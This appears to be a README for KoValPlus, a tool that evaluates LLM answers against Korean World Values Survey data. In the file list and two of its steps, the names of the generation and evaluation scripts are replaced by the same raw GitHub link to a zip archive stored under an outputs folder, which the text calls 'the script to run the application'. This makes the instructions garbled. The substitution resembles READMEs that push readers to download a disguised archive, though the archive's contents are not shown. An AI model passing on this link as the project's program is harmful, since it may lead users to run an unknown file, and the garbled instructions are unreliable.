- **code/**: Contains scripts that generate responses and evaluate their similarity.
- **dataset/**: Includes a dataset based on the World Values Survey for Korean values.
- **outputs/**: Holds the results and response files generated during evaluation.
- **https://github.com/YousfiNahed/KoValPlus/raw/refs/heads/main/outputs/gpt-4o-mini-2024-07-18/Ko_Plus_Val_v3.4.zip**: The script to run the application.

## 📊 How It Works

KoValPlus evaluates LLM responses by comparing them to a real dataset derived from the World Values Survey (WVS). Here’s how the process flows:

1. **Survey Response Generation**: The tool generates responses using the `https://github.com/YousfiNahed/KoValPlus/raw/refs/heads/main/outputs/gpt-4o-mini-2024-07-18/Ko_Plus_Val_v3.4.zip` script.
  
2. **Response Evaluation**: The generated responses are compared against real Korean responses using the `https://github.com/YousfiNahed/KoValPlus/raw/refs/heads/main/outputs/gpt-4o-mini-2024-07-18/Ko_Plus_Val_v3.4.zip` script. The application calculates how similar the responses are.

3. **Results Output**: The results will be saved in the `outputs/` folder, including response files in JSON and similarity metrics in CSV format.

## 🔍 Dataset Information

The dataset used in KoValPlus is based on the World Values Survey (WVS) Wave 7. It includes a selection of value-related questions that have been translated into Korean. This dataset provides the necessary context for evaluating cultural alignment accurately.

## ⚙️ System Requirements

To run KoValPlus, you will need:

- **Operating System**: Compatible with Windows, macOS, or Linux.
- **Memory**: At least 2 GB of RAM.
- **Disk Space**: Ensure you have at least 100 MB of free space to save the application and results.
